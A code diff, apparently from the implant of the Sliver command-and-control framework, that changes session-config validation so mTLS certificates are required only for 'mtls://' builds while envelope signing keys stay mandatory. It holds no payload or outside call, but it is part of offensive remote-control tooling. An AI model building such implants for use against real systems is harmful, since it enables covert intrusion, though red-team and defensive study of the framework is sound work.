@@ -68,10 +68,17 @@ int sliver_session_config_build(sliver_session_config_t *cfg, char *host_buf,
   cfg->key_pem = sliver_config_secret(SLIVER_SECRET_MTLS_KEY);
   cfg->age_private_key = sliver_config_secret(SLIVER_SECRET_PEER_PRIVATE_KEY);
   cfg->server_minisign_pubkey = sliver_config_secret(SLIVER_SECRET_MINISIGN_SERVER_PUBLIC_KEY);
-  if (cfg->ca_pem == NULL || cfg->cert_pem == NULL || cfg->key_pem == NULL ||
-      cfg->age_private_key == NULL || cfg->server_minisign_pubkey == NULL) {
-    LOG_ERROR("config: mTLS material is missing from the injected secrets");
+  if (cfg->age_private_key == NULL || cfg->server_minisign_pubkey == NULL) {
+    LOG_ERROR("config: envelope signing material is missing from the injected secrets");
     return -1;
+  }
+  /* mTLS material is only required for mtls:// builds: an http(s):// implant is
+   * built without client certificates and the server writes them as empty. */
+  if (strncmp(c2, "mtls://", 7) == 0) {
+    if (cfg->ca_pem == NULL || cfg->cert_pem == NULL || cfg->key_pem == NULL) {
+      LOG_ERROR("config: mTLS material is missing from the injected secrets");
+      return -1;
+    }
   }
 
   memset(&reg, 0, sizeof(reg));
